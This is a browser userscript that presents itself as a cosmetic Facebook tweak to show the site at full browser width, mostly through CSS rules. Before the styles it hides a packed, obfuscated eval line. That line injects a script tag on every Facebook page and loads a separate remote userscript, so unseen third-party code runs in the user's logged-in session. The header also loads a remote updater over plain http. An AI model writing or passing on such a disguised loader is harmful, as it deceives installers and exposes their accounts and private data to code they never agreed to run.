// ==UserScript==
// @name           Facebook Wide Plus + Last Update
// @description    View Facebook at the full width of your browser
// @author         South Somewhere
// @icon           http://www.gravatar.com/avatar.php?gravatar_id=7981358aef708e92eeadd4422aed9e5e&r=PG&s=64&default=identicon
// @require        http://sizzlemctwizzle.com/updater.php?id=98350&days=1&show
// @include        *facebook.com/*
// @include           http://www.facebook.com/*
// @include           https://www.facebook.com/*
// @include           http://*.facebook.com/*
// @include           https://*.facebook.com/*
// @exclude        *apps.facebook.com/*
// @version        v3.8
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))


GM_addStyle(
'#globalContainer, .uiUfi, #headerArea, .fbProfileByline {width:100% !important;}' + 
'#content {margin-left:15px !important;}' + 
'#pageHead {width:auto; margin-left:15px !important;}' + 
'#contentArea {width:auto !important; float:left; margin-right:300px !important;}' + 
'#headerArea + div + #contentArea {top: 80px;}' +
'#contentCol {position:relative !important;}' + 
'#headerArea {width:auto !important; margin-right:300px !important;}' + 
'#rightCol {position:absolute !important; top:15px; right:0;}' + 
'#pageFooter {display:none;}' + 
'.uiSideNav .hidden {display:block !important;}' + 
'#pagelet_apps_nav .navMoreLess {display:none !important;}' + 
'.fbEmuEgoUnitFirst, .fbEmuEgoUnit {display:none !important;}' + 
'#help_center_header {width:auto !important; margin-right:240px !important;}' + 
'#contentUnfriends {width:auto !important; float:left; margin-right:300px !important;}' + 
'#appbox {display:block !important;}'
);